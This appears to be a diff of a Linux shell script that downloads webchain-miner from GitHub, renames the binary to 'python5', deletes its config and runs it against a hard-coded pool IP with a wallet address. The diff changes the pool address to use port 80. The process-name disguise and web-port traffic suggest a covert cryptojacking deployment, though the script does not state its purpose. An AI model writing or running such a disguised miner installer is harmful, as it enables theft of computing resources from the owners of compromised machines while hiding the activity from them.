@@ -18,7 +18,7 @@ then
 else
 
 echo "Miner da install , chay thoi "
-./python5 -o 42.119.159.78 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python5 -o 42.119.159.78:80 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
      
 fi
@@ -30,6 +30,6 @@ wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2
 tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
 mv webchain-miner python5
 rm config.json
-./python5 -o 42.119.159.78 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python5 -o 42.119.159.78:80 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
 exit 0
